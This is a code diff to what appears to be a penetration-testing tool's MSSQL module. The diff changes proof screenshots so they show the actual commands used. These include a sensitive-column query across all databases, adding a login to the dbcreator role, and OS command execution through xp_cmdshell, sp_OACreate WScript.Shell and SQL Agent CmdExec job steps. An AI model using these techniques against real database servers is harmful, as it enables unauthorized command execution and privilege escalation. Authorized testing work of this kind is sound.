@@ -2553,15 +2553,15 @@ def cmd_bloodhound(args: argparse.Namespace) -> int:
     return 0
 
 
-def _mssql_shot(args, ip, name, title, subtitle, command, output):
-    """Render a terminal-style proof screenshot of an executed MSSQL action into
+def _mssql_shot(args, ip, name, banner, command, output):
+    """Render a faithful terminal screenshot of an executed MSSQL action into
     engagement/screenshots/. Returns the saved path or None."""
     if not getattr(args, "screenshots", False):
         return None
     from . import mssql, screenshot
     if not screenshot.available():
         return None
-    png = screenshot.capture_html(mssql.proof_html(title, subtitle, command, output))
+    png = screenshot.capture_html(mssql.proof_html(command, output, banner=banner))
     if not png:
         return None
     shot_dir = os.path.join(args.output_dir, "screenshots")
@@ -2723,10 +2723,12 @@ def cmd_mssql(args: argparse.Namespace) -> int:
                     sensitive = "\n".join(f"{db}: {', '.join(v['interesting'][:8])}"
                                           for db, v in mined.items() if v["interesting"])
                     if sensitive:
-                        _mssql_shot(args, t["ip"], "datamine", "Sensitive data located",
-                                    f"{t['ip']}:{t['port']}",
-                                    "SELECT sensitive columns across all databases",
-                                    sensitive)
+                        _mssql_shot(
+                            args, t["ip"], "datamine",
+                            f"impacket-mssqlclient {creds['user']}@{t['ip']}",
+                            "SELECT s.name+'.'+t.name+'.'+c.name FROM sys.columns c ... "
+                            "-- sensitive columns across all databases",
+                            sensitive)
 
             # Per-database object-permission mining (guest / public / object grants).
             if args.perms:
@@ -2753,13 +2755,21 @@ def cmd_mssql(args: argparse.Namespace) -> int:
                     extra = " + role membership" if ev.get("perm") == "1" else ""
                     print(f"      [+] {t['ip']}: PROVED write impact (field modify"
                           f"{extra}) - reverted")
+                    proof_cmds = [
+                        f"CREATE TABLE ##recce_{token} (id INT, note VARCHAR(64))",
+                        f"INSERT INTO ##recce_{token} VALUES (1,'before')",
+                        f"SELECT note FROM ##recce_{token}   -- before",
+                        f"UPDATE ##recce_{token} SET note='{ev.get('update', '')}'",
+                        f"SELECT note FROM ##recce_{token}   -- after (MODIFIED)",
+                        f"DROP TABLE ##recce_{token}   -- reverted"]
+                    proof_out = f"before\n{ev.get('update', '')}"
+                    if ev.get("perm") == "1":
+                        proof_cmds.append("ALTER SERVER ROLE dbcreator ADD MEMBER "
+                                          f"recce_{token}; SELECT IS_SRVROLEMEMBER(...)")
+                        proof_out += "\n1   -- role membership added (then reverted)"
                     _mssql_shot(args, t["ip"], "write_proof",
-                                "Proved write + permission-modify (reversible)",
-                                f"{t['ip']}:{t['port']}  as {creds['user']}",
-                                "CREATE/INSERT/UPDATE (reverted) + role toggle (reverted)",
-                                f"before -> {ev.get('update', '')}"
-                                + ("\ndbcreator membership toggled: 1 (reverted)"
-                                   if ev.get("perm") == "1" else ""))
+                                f"impacket-mssqlclient {creds['user']}@{t['ip']}",
+                                proof_cmds, proof_out)
                 else:
                     print(f"      [!] {t['ip']} write proof: {werr}")
 
@@ -2775,10 +2785,16 @@ def cmd_mssql(args: argparse.Namespace) -> int:
                 else:
                     snippet = " | ".join((out or "(no output)").splitlines()[:4])
                     print(f"      [+] {t['ip']} RCE via {args.method}: {snippet}")
+                    rce_cmds = {
+                        "xp": [f"EXEC xp_cmdshell '{args.exec_cmd}'"],
+                        "ole": ["EXEC sp_OACreate 'WScript.Shell', @o OUT",
+                                f"EXEC sp_OAMethod @o,'Run',NULL,'cmd /c {args.exec_cmd} ...'"],
+                        "agent": ["EXEC msdb.dbo.sp_add_jobstep @subsystem='CmdExec', "
+                                  f"@command='cmd /c {args.exec_cmd}'"],
+                    }.get(args.method, [f"EXEC ... {args.exec_cmd}"])
                     _mssql_shot(args, t["ip"], f"rce_{args.method}",
-                                f"Confirmed RCE via {args.method}",
-                                f"{t['ip']}:{t['port']}", f"EXEC ... {args.exec_cmd}",
-                                out or "(no output)")
+                                f"impacket-mssqlclient {creds['user']}@{t['ip']}",
+                                rce_cmds, out or "(no output)")
                     analysis["findings"].insert(0, mssql._finding(
                         "critical", f"Confirmed OS command execution via {args.method}",
                         f"{t['ip']}:{t['port']}",
